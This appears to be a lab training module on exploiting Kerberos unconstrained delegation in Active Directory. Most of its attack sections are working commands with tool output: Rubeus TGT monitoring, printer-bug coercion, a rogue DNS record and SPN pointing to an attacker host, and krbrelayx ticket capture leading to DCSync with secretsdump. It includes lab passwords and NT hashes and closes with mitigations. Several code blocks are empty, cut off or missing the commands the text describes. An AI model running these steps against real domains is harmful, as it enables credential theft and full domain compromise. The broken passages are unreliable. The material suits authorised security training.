# Unconstrained Delegation in Computers Account
`Unconstrained delegation` was the only type of delegation available in Windows 2000. If a user requests a service ticket on a server with unconstrained delegation enabled, the user's Ticket Granting Ticket (TGT) is embedded into the service ticket that is then presented to the server.

The server can cache this ticket in memory and then pretend to be that user for subsequent resource requests in the domain. If unconstrained delegation is not enabled, only the user's Ticket Granting Service (TGS) ticket will be stored in memory. In this case, if the machine is compromised, an attacker could only access the resource specified in the TGS ticket in that user's context.

We will walk through two attack scenarios:

- Waiting for a privileged user to authenticate
- Leveraging the Printer Bug

---

## Waiting for Privileged User Authentication

If we are able to compromise a server that has unconstrained delegation enabled, and a Domain Administrator subsequently logs in, we will be able to extract their TGT and use it to move laterally and compromise other machines, including Domain Controllers.

[Rubeus](https://github.com/GhostPack/Rubeus) is the go-to tool for this attack. As a local administrator, Rubeus can be run to monitor stored tickets. If a TGT is found within a TGS ticket, Rubeus will display it to us.

#### Monitor Stored Tickets with Rubeus

A few moments later, `Sarah Lafferty` connects to the compromised server. Rubeus retrieves Sarah's copy of the TGT that was embedded in her TGS ticket and displays it to us encoded in base64.

```

Thanks to `PowerView`, we can list the groups to which Sarah belongs. She happens to be in the `Domain Admins` group. So we have the TGT of a Domain Admin now.

#### Group Enumeration
```powershell-session
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainGroup -MemberIdentity sarah.lafferty

grouptype              : DOMAIN_LOCAL_SCOPE, SECURITY

```

So we will use this TGT to access the Domain Controller's `CIFS` service, for example. The `/ptt` option/flag is used to pass the received ticket into memory so that it can be used for future requests.

**Note:** We can also use the command `net view \\COMPUTERNAME` to identify available shares.

In case the above command doesn't work, we can also use the [renew action](https://github.com/GhostPack/Rubeus#renew) to get a brand new TGT instead of a TGS ticket:

```

We could also get a TGS ticket for the `LDAP` service and ask for synchronization with the DC to get all the users' password hashes.

## Leveraging the Printer Bug

The Printer Bug is a flaw in the [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spools named pipe with the [RpcOpenPrinter](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f) method and use the [RpcRemoteFindFirstPrinterChangeNotificationEx](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d) method, and force the server to authenticate to any host provided by the client over SMB.

In other words, the Printer Bug flaw can be leveraged to coerce a server to authenticate back to an arbitrary host. It can be combined with unconstrained delegation to force a Domain Controller to authenticate to a host we control. For example, if we can gain control of `SQL01` in the example above, then we may coerce `DC01` to authenticate back to the compromised host and retrieve the TGT for `DC01`. Using this TGT, we would then be able to gain full access to `DC01` and perform attacks such as `DCSync` to compromise the domain. If the Domain Controller(s) do not have the spooler service running, we can use this against any other computer in the domain and craft silver tickets with `Rubeus`, using the computer's account TGT. Silver tickets will be discussed later in this module.

This attack can be performed using [SpoolSample PoC](https://github.com/leechristensen/SpoolSample), which is used to coerce Windows hosts to authenticate to other hosts via the `MS-RPRN RPC` interface.

Let's walk through an example using `SQLO1` and `DC01` in our lab. In a scenario where a compromised host configured with unconstrained delegation has the spool service running, in this case, the Domain Controller, the `SpoolSample` tool can be combined with `Rubeus` to monitor for logon events and capture the TGT of the target host.

Once we compromise a host configured to allow unconstrained delegation, we can attempt this attack against a Domain Controller by first starting `Rubeus` in monitor mode on the compromised host (SQL01 in our example).

#### Monitoring Tickets with Rubeus
```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___

  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
```

With `Rubeus` running in monitor mode, we then attempt to trigger the Printer Bug from the same host (SQL01) by running the `SpoolSample` tool in another console window. The syntax for this tool is `SpoolSample.exe <target server> <capture server>`, where the target server in our example lab is `DC01` and the capture server is `SQL01`.

#### Abusing the Printer Bug
```powershell-session
PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function

Target server attempted authentication and got an access denied. If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.
```

If everything works as expected, we will get the above confirmation message from the tool. Switching back to the console running `Rubeus` in monitor mode, we retrieved the TGT from the `DC01$` account, which is the Domain Controller machine account.

We can capture any account's hash, such as the Administrator account, and then we can use Rubeus or Mimikatz to get a ticket from the compromised account. For example, let's take Sarah' hash `0fcb586d2aec31967c8a310d1ac2bf50` and create a ticket with it:

### S4U2self for Non-Domain Controllers

If the target computer is not a domain controller, or if we want to execute attacks other than `DCSync`, we can use `S4U2self` to obtain a Service Ticket on behalf of any user we want to impersonate.

With the ticket captured from `DC01` using `Rubeus monitor` and `SpoolSample` we can use `Rubeus s4u /self` to forge a service ticket for any service. Let's create a ticket to connect through SMB using the `CIFS` service. We will need to use `Rubeus s4u /self`, set the alternative service to `CIFS`, and use the ticket we have:
```powershell-session
PS C:\Tools> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>

This command allows us to impersonate `Administrator` and request a service ticket for the `CIFS` service, enabling SMB connections as the impersonated user. This method is particularly useful for scenarios where we have a ticket from a computer that is not a domain controller.

# Unconstrained Delegation in Users Account

Users in Active Directory can also be configured for unconstrained delegation, and it's quite different to exploit. To get a list of user accounts with this flag set, we can use the PowerView function [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) with a specific LDAP filter that will look for users with the `TRUSTED_FOR_DELEGATION` flag set in their UAC.

If we somehow managed to compromise this account (i.e., `sqldev`), we also need to be able to update its SPN list, so we need an account with `GenericWrite` privileges on the compromised account.

We can leverage this unconstrained delegation privilege to become a domain administrator if these conditions are met.

This attack aims to create a DNS record that will point to our attack machine. This DNS record will be a fake computer in the Active Directory environment. Once this DNS record is registered, we will add the SPN `CIFS/our_dns_record` to the account we compromised, which is in an unconstrained delegation. So, if a victim tries to connect via SMB to our fake machine, it will ship a copy of its TGT in its TGS ticket since it will ask for a ticket for `CIFS/our_registration_dns`. This TGS ticket will be sent to the IP address we chose when registering the DNS record, i.e., our attack machine. All we have to do then is extract the TGT and use it.

We will use Dirkjanm's [krbrelayx](https://github.com/dirkjanm/krbrelayx) tools suite for this attack.

First, we'll use `dnstool.py` to add a fake DNS record `roguecomputer.inlanefreight.local` pointing to our attack host `10.10.14.2` using any valid domain account.

#### Create a Fake DNS Record
```shell-session
slomkm@htb[/htb]$ git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
slomkm@htb[/htb]$ python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207    

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

We can verify if the DNS record has been created using `nslookup`.

#### Verifying DNS Record
```shell-session
slomkm@htb[/htb]$ nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local

Server:     dc01.inlanefreight.local
Address:    10.129.1.207#53

Name:   roguecomputer.inlanefreight.local
Address: 10.10.14.2
```

Then we add a crafted SPN to our target account using `addspn.py`. The SPN must be `CIFS/dns_entry`, so in our case, we use the option `-s` followed by `CIFS/roguecomputer.inlanefreight.local`. `CIFS` stands for Common Internet File System, equivalent to SMB. The option `--target-type samname` specifies that the target is a username, if unspecified, `krbrelayx` will assume it's a hostname.

#### Craft SPN on the Target User (sqldev)
```shell-session
slomkm@htb[/htb]$ python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Any account trying to authenticate via SMB to `roguecomputer.inlanefreight.local` will have a copy of its TGT in its requested TGS ticket. We can use the PrinterBug tool to coerce `DC01$` into authenticating against our fake host. But before that, we need to look for the TGS ticket and TGT on our attacking host using `krbrelayx.py`. We provide this tool with the compromised account's secret key (NT hash) to decrypt the received TGS ticket. In this case the compromised account and target is `sqldev`, so we need to provide its hash (`cf3a5525ee9414229e66279623ed5c58`) in order to decrypt the received TGS ticket.

#### Using Krbrelayx
```shell-session
slomkm@htb[/htb]$ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in export mode (all tickets will be saved to disk)
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```

If we receive an error while trying to execute `krbrelayx.py`, we need to remove or update the impacket installation. The following steps are to remove impacket and reinstall it from the source:

#### Removing and Installing Impacket from source
```shell-session
slomkm@htb[/htb]$ sudo apt remove python3-impacket
slomkm@htb[/htb]$ sudo apt remove impacket-scripts
slomkm@htb[/htb]$ git clone -q https://github.com/fortra/impacket;cd impacket
slomkm@htb[/htb]$ sudo python3 -m pip install .
...SNIP...
```

**Note:** If we execute `krbrelayx.py` from PwnBox it will get an error for the HTTP server, as PwnBox by default use this port. Even if we have this error, it will not affect the use of the tool for this case.

Then we leverage the printer bug. We can use [dementor.py](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) or [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) available with krbrelayx.

#### Leveraging the Printer Bug with printerbug.py
```shell-session
slomkm@htb[/htb]$ python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local

[*] Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[*] Attempting to trigger authentication via rprn RPC at 10.129.205.35
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

Alternatively we can use `dementor.py`, instead of `printerbug.py`:

#### Leveraging the Printer Bug with dementor.py
```shell-session
slomkm@htb[/htb]$ python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local

[*] connecting to dc01.inlanefreight.local
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] done!
```

**Note:** We don't need to use both tools, only one suffices.

This triggered an authentication attempt from `DC01` to our attacking host, and the tool automatically extracted the TGT embedded inside the TGS ticket.

#### Krbrelayx performing the Attack
```shell-session
slomkm@htb[/htb]$ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in export mode (all tickets will be saved to disk)
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.1.207
[*] Got ticket for DC01$@INLANEFREIGHT.LOCAL [krbtgt@INLANEFREIGHT.LOCAL]

[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.1.207
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

This TGT has been saved to disk in the following file `DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache`.

Finally, we can use `impacket` to use this ticket by exporting its path in the `KRB5CCNAME` environment variable and then using `secretsdump.py` to perform a `DCSync` attack.

#### Using Impacket with Kerberos Authentication for the DCSync attack
```shell-session
slomkm@htb[/htb]$ export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
slomkm@htb[/htb]$ secretsdump.py -k -no-pass dc01.inlanefreight.local

## Wrap-up

Unconstrained delegation should be avoided in modern Active Directory environments in favor of constrained or resource-based constrained delegation wherever possible. However, some applications may not work with constrained delegation, and if unconstrained delegation is an absolute necessity, steps can be taken to reduce the risk. Sensitive accounts can be marked as Sensitive and cannot be delegated or be placed into the Protected User group. This group blocks its members from being used for Kerberos delegation and will keep their TGTs off hosts after they authenticate.
